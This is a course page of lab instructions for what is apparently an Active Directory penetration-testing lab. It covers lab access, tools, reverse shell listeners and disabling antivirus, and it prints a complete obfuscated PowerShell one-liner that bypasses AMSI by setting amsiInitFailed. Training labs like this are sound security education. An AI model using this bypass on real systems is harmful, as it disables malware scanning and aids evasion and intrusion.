# 🎯 Learning Objectives

<figure><img src="../../../.gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>

## **Instructions**

* You can use a web browser or OpenVPN client to access the lab. See the 'Connecting to lab' document for more details.
* All the tools used in the course are available in C:\AD\Tools.zip on your student machine. However, please feel free to use tools of your choice.
* Unless specified otherwise, all the PowerShell based tools (especially those used for enumeration) are executed using InviShell to avoid verbose logging. Binaries like Rubeus.exe may be inconsistent when used from InviShell, run them from the normal command prompt.
* The lab is reverted daily to maintain a known good state. The student VMs are not reverted but still, please save your notes offline!
* The lab manual uses a terminology for user-specific resources. For example, if you see `studentx` and your user ID is `student41`, read `studentx` as `student41`, `supportxuser` as `support41user`, and so on.
* Your student VM hostname could be dcorp-studentx or dcorp-stdx
* Please remember to turn off or add an exception to your student VM's firewall when you run a listener for a reverse shell.
* The C:\AD directory is exempted from Windows Defender, but AMSI may detect some tools when you load them. The lab manual uses the following AMSI bypass:

```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

* If you want to turn off AV on the student VM after getting local admin privileges, please use the GUI as Tamper Protection incapacitates the 'Set-MpPreference' command.
* Note that we are using obfuscated versions of publicly available tools. Even if the name of the executable remains the same, the tool is obfuscated. For example, Rubeus.exe in the lab is an obfuscated version of publicly available Rubeus.
* Note that if you get an error like 'This app can't run on your PC' for any executable (Loader.exe, SafetyKatz.exe or Rubeus.exe), re-extract it from C:\AD\Tools.zip:
* Have fun!
